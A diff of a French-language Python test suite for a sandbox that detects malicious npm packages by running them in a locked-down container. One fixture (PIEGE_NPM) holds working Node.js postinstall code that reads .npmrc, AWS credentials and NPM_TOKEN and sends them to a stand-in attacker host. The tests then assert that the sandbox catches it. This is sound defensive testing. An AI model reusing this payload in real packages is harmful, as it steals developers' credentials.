@@ -23,11 +23,23 @@ def test_le_conteneur_cible_est_verrouille():
     assert "AWS_SECRET_ACCESS_KEY=s" in texte
 
 
-def test_npm_pas_encore(tmp_path):
+def test_npm_a_son_scenario_et_son_image_dans_le_meme_conteneur_verrouille():
+    cmd = sandbox.commande_cible(nom="sas-cible-x", reseau="sas-sb-x", image="sas-sandbox-node:2",
+                                 dossier="/tmp/sb", archive="p-1.0.0.tgz", module="@org/p",
+                                 attente_s=5, leurres={"NPM_TOKEN": "s"}, script="lancer_npm.sh")
+    texte = " ".join(cmd)
+    for option in ("--read-only", "--cap-drop ALL", "--security-opt no-new-privileges",
+                   "--pids-limit 256", "--memory 1g", "--network sas-sb-x", "--user 10001:10001"):
+        assert option in texte, option
+    assert cmd[-3:] == ["sas-sandbox-node:2", "sh", "/outils/lancer_npm.sh"]
+    assert "SAS_MODULE=@org/p" in texte and "NPM_TOKEN=s" in texte
+
+
+def test_un_autre_ecosysteme_n_est_pas_execute(tmp_path):
     archive = tmp_path / "p-1.0.tgz"
     archive.write_bytes(b"x")
     with pytest.raises(NotImplementedError):
-        sandbox.executer(Ecosysteme.NPM, archive, "p")
+        sandbox.executer("maven", archive, "p")
 
 
 def test_le_stub_reste_disponible(tmp_path, monkeypatch):
@@ -189,3 +201,61 @@ def test_c2_un_paquet_sage_n_est_pas_signale(tmp_path, monkeypatch):
     monkeypatch.setenv("SAS_SANDBOX_ATTENTE", "1")
     r = sandbox.executer(Ecosysteme.PYPI, _roue(tmp_path, "sage2", "X = 1\n"), "sage2")
     assert rapport.TRACES_EFFACEES not in r.processus
+
+
+# --- npm : la même sandbox, scénario npm (scripts d'installation, puis import du module) -------
+PIEGE_NPM = """
+const fs = require("fs"), os = require("os"), dns = require("dns"), net = require("net");
+let vole = "";
+for (const f of [".npmrc", ".aws/credentials"]) {
+  try { vole += fs.readFileSync(os.homedir() + "/" + f, "utf8"); } catch (e) {}
+}
+dns.lookup("collecte-npm.attaquant-demo.example", () => {});
+const s = net.connect(80, "collecte-npm.attaquant-demo.example", () => {
+  s.write("POST /c HTTP/1.1\\r\\nHost: collecte-npm.attaquant-demo.example\\r\\n\\r\\n" + Buffer.from(vole + (process.env.NPM_TOKEN || "")).toString("base64"));
+  setTimeout(() => s.destroy(), 500);
+});
+s.on("error", () => {});
+"""
+
+
+def _tgz(dossier, nom, fichiers, scripts=None):
+    import io
+    import json
+    import tarfile
+    pj = {"name": nom, "version": "1.0.0", "main": "index.js", **({"scripts": scripts} if scripts else {})}
+    chemin = dossier / f"{nom}-1.0.0.tgz"
+    with tarfile.open(chemin, "w:gz") as t:
+        for f, texte in {"package.json": json.dumps(pj), **fichiers}.items():
+            octets = texte.encode()
+            info = tarfile.TarInfo(f"package/{f}")
+            info.size = len(octets)
+            t.addfile(info, io.BytesIO(octets))
+    return chemin
+
+
+@pytest.mark.docker
+@avec_docker
+def test_npm_un_postinstall_piege_est_pris_la_main_dans_le_sac(tmp_path, monkeypatch):
+    monkeypatch.setenv("SAS_SANDBOX_ATTENTE", "2")
+    archive = _tgz(tmp_path, "piege-npm", {"index.js": "module.exports = 1;\n",
+                                           "post.js": PIEGE_NPM},
+                   scripts={"postinstall": "node post.js"})
+    r = sandbox.executer(Ecosysteme.NPM, archive, "piege-npm")
+    assert "collecte-npm.attaquant-demo.example" in r.requetes_dns
+    assert "collecte-npm.attaquant-demo.example:80" in r.connexions
+    assert {"~/.npmrc", "~/.aws/credentials"} <= set(r.leurres_lus)
+    assert "NPM_TOKEN (exfiltré)" in r.leurres_lus
+    assert any(p.startswith("sh -c") and "post.js" in p for p in r.processus)
+    assert r.processus[0] != "(traces de la sandbox effacées ou réécrites par le paquet)"
+
+
+@pytest.mark.docker
+@avec_docker
+def test_npm_un_paquet_sage_donne_un_rapport_propre(tmp_path, monkeypatch):
+    monkeypatch.setenv("SAS_SANDBOX_ATTENTE", "1")
+    archive = _tgz(tmp_path, "sage-npm", {"index.js": "module.exports = (a, b) => a + b;\n"})
+    r = sandbox.executer(Ecosysteme.NPM, archive, "sage-npm")
+    assert (r.requetes_dns, r.connexions, r.leurres_lus, r.fichiers_sensibles) == ([], [], [], [])
+    assert r.code_sortie == 0 and not r.delai_depasse
+    assert "(traces de la sandbox effacées ou réécrites par le paquet)" not in r.processus
